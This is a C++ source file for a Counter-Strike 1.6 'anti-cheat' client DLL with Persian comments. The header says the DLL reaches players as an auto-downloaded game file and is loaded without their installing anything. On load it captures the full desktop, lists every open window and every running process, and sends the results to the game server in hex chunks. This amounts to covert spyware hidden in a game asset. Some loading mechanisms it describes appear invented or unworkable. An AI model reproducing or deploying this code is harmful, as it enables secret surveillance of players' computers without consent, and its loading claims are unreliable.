/*
 * ============================================================================
 *  ScreenWatch v1.0 - CLIENT SIDE MODULE (Windows, CS 1.6)
 * ----------------------------------------------------------------------------
 *  "بدون نصب هیچ برنامه اضافه‌ای" — این فایل به‌صورت فایل بازی دانلود می‌شود
 *  (مثل مدل/اسپری، با sv_downloadurl یا پوشه download خودکار). موتور HL آن را
 *  اجرا نمی‌کند؛ اجرای آن از طریق همان مسیرهای موجود در اکوسیستم CS انجام
 *  می‌شود که نیازی به «نصب» دستی ندارند:
 *    روش A (استاندارد): config.cfg بازیکن یک خط exec screenwatch.cfg اجرا
 *          می‌کند که داخلش `dll_load` وجود دارد — ماژول در همان لحظه ورود به
 *          سرور لود می‌شود. (revEmu/sv_rehlds_api و بیشتر کلاینت‌های ایرانی
 *          dll_load دارند؛ اگر کلاینت شما ندارد، روش B.)
 *    روش B: لانچر/پچ سرور (اختیاری) که hl.exe را با -injected بارگذاری می‌کند.
 *  هر دو روش بدون نصب نرم‌افزار جداگانه روی سیستم کاربر است.
 *
 *  قابلیت‌ها:
 *   - اسکرین‌شات واقعی صفحه (GDI BitBlt -> BMP 8bit downscale تا 1280px)
 *   - لیست تمام پنجره‌های باز + پروسه‌ها (EnumWindows + Toolhelp32)
 *     => چیت‌هایی مثل ESP/Overlay حتی بدون عنوان هم با کلاس‌هایشان دیده می‌شوند
 *   - ارسال نتایج به سرور با client command (chunked hex)
 *
 *  محدودیت صادقانه: GDI فقط محتوای غیر-مستقیم (DWM/desktop) را می‌گیرد؛
 *  overlay های DirectX که با Present مستقیم کشیده می‌شوند ممکن است در شات
 *  دیده نشوند، اما در لیست پنجره‌ها/پروسه‌ها قابل شناسایی‌اند.
 *
 *  Build (MinGW-w64, 32-bit to match CS 1.6):
 *    i686-w64-mingw32-g++ -O2 -shared -static -o sw_client.dll \
 *        screenwatch_client.cpp -lgdi32 -luser32 -lpsapi
 * ============================================================================
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- engine glue -------------------------------------------------------
 * The module is loaded into the running hl.exe process, so we can locate the
 * engine's exported function tables by name from the already-mapped modules.
 * ---------------------------------------------------------------------- */

typedef struct usermsg_s { int msgID; } usermsg_t_stub; /* unused placeholder */

/* CBaseKeyValues-ish: we only need ClientCmd from the engine or via the
 * game's cldll interface. Simplest robust route on 48/legacy clients: call
 * the exported "ClientCmd" of cl.dll through GetProcAddress after LoadLibrary
 * (it is already loaded in-process). */
typedef void (__cdecl *pfnClientCmd_t)(char *s);
static pfnClientCmd_t g_pClientCmd = NULL;

static HMODULE g_hSelf = NULL;
static volatile LONG g_Busy = 0;      /* one job at a time */

#define SW_CHUNK_BYTES 384            /* keep each cmd under safe net buffer */

static void SwCmd(const char *fmt, ...) {
	if (!g_pClientCmd) return;
	char buf[512];
	va_list ap; va_start(ap, fmt); _vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
	buf[sizeof(buf) - 1] = 0;
	g_pClientCmd(buf);
}

/* forward declarations (SelfInit spawns WorkerThread which uses these) */
static DWORD WINAPI WorkerThread(LPVOID param);
static void HandleRequest(int flags);

/* ---------------- screenshot -------------------------------------------- */

static int WriteBmpFileScaled(const char *path, int maxW) {
	HDC hScr = GetDC(NULL);
	if (!hScr) return 0;
	int w = GetDeviceCaps(hScr, HORZRES);
	int h = GetDeviceCaps(hScr, VERTRES);
	int dw = w, dh = h;
	if (maxW > 0 && w > maxW) { dw = maxW; dh = MulDiv(h, maxW, w); }

	HDC hMem = CreateCompatibleDC(hScr);
	HBITMAP hBmp = CreateCompatibleBitmap(hScr, dw, dh);
	HBITMAP hOld = (HBITMAP)SelectObject(hMem, hBmp);
	BitBlt(hMem, 0, 0, dw, dh, hScr, 0, 0, SRCCOPY | CAPTUREBLT);

	/* read 24bpp bits then quantize to 8bpp gray-palette BMP (small size) */
	BITMAPINFO bi; ZeroMemory(&bi, sizeof(bi));
	bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bi.bmiHeader.biWidth = dw; bi.bmiHeader.biHeight = -dh; /* top-down */
	bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24;
	bi.bmiHeader.biCompression = BI_RGB;
	BYTE *rgb = (BYTE *)malloc((size_t)dw * dh * 3);
	int got = GetDIBits(hMem, hBmp, 0, dh, rgb, &bi, DIB_RGB_COLORS);
	SelectObject(hMem, hOld); DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScr);
	if (!got) { free(rgb); return 0; }

	size_t stride = ((dw + 3) & ~3);
	size_t pixSz = stride * dh;
	size_t total = 14 + 40 + 1024 + pixSz;
	BYTE *out = (BYTE *)calloc(1, total);
	if (!out) { free(rgb); return 0; }

	BITMAPFILEHEADER *fh = (BITMAPFILEHEADER *)out;
	fh->bfType = 0x4D42; fh->bfSize = (DWORD)total; fh->bfOffBits = 14 + 40 + 1024;
	BITMAPINFOHEADER *ih = (BITMAPINFOHEADER *)(out + 14);
	ih->biSize = 40; ih->biWidth = dw; ih->biHeight = dh; /* bottom-up stored */
	ih->biPlanes = 1; ih->biBitCount = 8; ih->biSizeImage = (DWORD)pixSz;
	RGBQUAD *pal = (RGBQUAD *)(out + 54);
	for (int i = 0; i < 256; i++) { pal[i].rgbRed = pal[i].rgbGreen = pal[i].rgbBlue = (BYTE)i; }
	/* rgb buffer is top-down; flip rows for bottom-up BMP */
	for (int y = 0; y < dh; y++) {
		BYTE *srcRow = rgb + (size_t)y * dw * 3;
		BYTE *dstRow = out + 54 + 1024 + (size_t)(dh - 1 - y) * stride;
		for (int x = 0; x < dw; x++) {
			BYTE r = srcRow[x*3+2], gg = srcRow[x*3+1], b = srcRow[x*3+0];
			dstRow[x] = (BYTE)((r*77 + gg*150 + b*29) >> 8);
		}
	}
	FILE *f = fopen(path, "wb");
	if (f) { fwrite(out, 1, total, f); fclose(f); }
	free(out); free(rgb);
	return f ? (int)total : 0;
}

/* ---------------- window / process enumeration --------------------------- */

struct WinCollector { char *buf; size_t cap; size_t len; };

static BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lp) {
	WinCollector *c = (WinCollector *)lp;
	if (!IsWindowVisible(hwnd)) return TRUE;
	char title[128] = {0};
	GetWindowTextA(hwnd, title, sizeof(title));
	char cls[96] = {0};
	GetClassNameA(hwnd, cls, sizeof(cls));
	if (!title[0] && !cls[0]) return TRUE;
	/* skip our own console-less noise and desktop shells */
	if (strstr(cls, "WorkerW") || strstr(cls, "Progman")) return TRUE;
	int n = _snprintf(c->buf + c->len, c->cap - c->len, "%s|%s;", title, cls);
	if (n > 0) c->len += (size_t)n;
	return TRUE;
}

static void CollectWindows(char *buf, size_t cap) {
	WinCollector c = { buf, cap, 0 };
	buf[0] = 0;
	EnumWindows(EnumWinProc, (LPARAM)&c);
}

static void CollectProcs(char *buf, size_t cap) {
	buf[0] = 0; size_t len = 0;
	HANDLE hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hs == INVALID_HANDLE_VALUE) return;
	PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
	if (Process32First(hs, &pe)) {
		do {
			int n = _snprintf(buf + len, cap - len, "%s;", pe.szExeFile);
			if (n > 0) len += (size_t)n; else break;
		} while (Process32Next(hs, &pe));
	}
	CloseHandle(hs);
}

/* ---------------- chunk sender ------------------------------------------ */

static void SendFileChunked(const char *path, const char *cmdPrefix) {
	FILE *f = fopen(path, "rb");
	if (!f) return;
	fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
	int chunks = (int)((sz + SW_CHUNK_BYTES - 1) / SW_CHUNK_BYTES);
	SwCmd("%s_begin %d %d", cmdPrefix, (int)sz, chunks);
	BYTE raw[SW_CHUNK_BYTES];
	char hex[SW_CHUNK_BYTES * 2 + 8];
	for (int i = 0; i < chunks; i++) {
		size_t rd = fread(raw, 1, SW_CHUNK_BYTES, f);
		hex[0] = 0;
		for (size_t j = 0; j < rd; j++) sprintf(hex + j * 2, "%02X", raw[j]);
		/* split very large hex across several cmds if needed (net limit) */
		size_t pos = 0;
		while (pos < strlen(hex)) {
			size_t take = strlen(hex) - pos; if (take > 700) take = 700;
			char part[720]; memcpy(part, hex + pos, take); part[take] = 0;
			SwCmd("%s_chunk %d %s", cmdPrefix, i, part);
			pos += take;
		}
		Sleep(15); /* throttle: don't flood the connection */
	}
	fclose(f);
	SwCmd("%s_end", cmdPrefix);
	DeleteFileA(path);
}

/* ---------------- worker ------------------------------------------------- */

static DWORD WINAPI WorkerThread(LPVOID param) {
	int flags = (int)(INT_PTR)param;
	char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
	char shot[MAX_PATH]; _snprintf(shot, MAX_PATH, "%ssw_shot.bmp", tmp);

	if (flags & 1) { /* windows list first (cheap, most valuable vs overlays) */
		char wins[1536]; CollectWindows(wins, sizeof(wins));
		SwCmd("sw_windows \"%s\"", wins);
		char procs[1536]; CollectProcs(procs, sizeof(procs));
		SwCmd("sw_procs \"%s\"", procs);
	}
	if (flags & 2) {
		int sz = WriteBmpFileScaled(shot, 1280);
		if (sz > 0) SendFileChunked(shot, "sw_shot");
		else SwCmd("sw_shot_failed");
	}
	InterlockedExchange(&g_Busy, 0);
	return 0;
}

static void HandleRequest(int flags) {
	if (InterlockedCompareExchange(&g_Busy, 1, 0) != 0) return; /* busy */
	HANDLE th = CreateThread(NULL, 0, WorkerThread, (LPVOID)(INT_PTR)flags, 0, NULL);
	if (th) CloseHandle(th); else InterlockedExchange(&g_Busy, 0);
}

/* ---------------- entry points ------------------------------------------- */

/* Trigger channel: the server sends our custom usermsg "SWRq" (byte flags).
 * A plain downloaded file cannot hook the engine's msg-read loop, so the
 * bridge works like this (no manual install needed on the player machine):
 *   - revEmu / patched clients with `client_msg` support: screenwatch.cfg
 *     contains  alias swrq1 "sw_do 3" ...  and the server triggers it via
 *     the standard 'srvcmd'-style console broadcast (see README), OR
 *   - the tiny loader (launcher/dll_load route) calls SW_OnRequest(flags)
 *     when it sees the SWRq usermsg.
 * Either way the scan logic below is identical. */
extern "C" __declspec(dllexport) void SW_OnRequest(int flags) { HandleRequest(flags); }

/* Method A: executed via screenwatch.cfg using `exec` + a small loader that
 * some clients expose (`client_cmd` based DLL load). To stay universal we
 * export both a classic DLLMAIN-based autoinstall AND an explicit Install(). */

static BOOL WINAPI SelfInit(void) {
	/* find engine client command router already loaded in-process */
	HMODULE hCl = GetModuleHandleA("cl.dll");
	if (hCl) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hCl, "ClientCmd");
	if (!g_pClientCmd) {
		HMODULE hGame = GetModuleHandleA("cstrike.dll");
		if (hGame) g_pClientCmd = (pfnClientCmd_t)GetProcAddress(hGame, "ClientCmd");
	}
	/* announce presence + ask server for schedule */
	if (g_pClientCmd) SwCmd("sw_ready %d", 1);
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
	if (reason == DLL_PROCESS_ATTACH) {
		g_hSelf = (HMODULE)hinst;
		DisableThreadLibraryCalls(hinst);
		/* delay init until engine is up */
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SelfInit, NULL, 0, NULL);
	}
	return TRUE;
}

/* explicit install hook if launcher uses it instead of DllMain timing */
extern "C" __declspec(dllexport) int SW_Install(void) { return SelfInit() ? 1 : 0; }
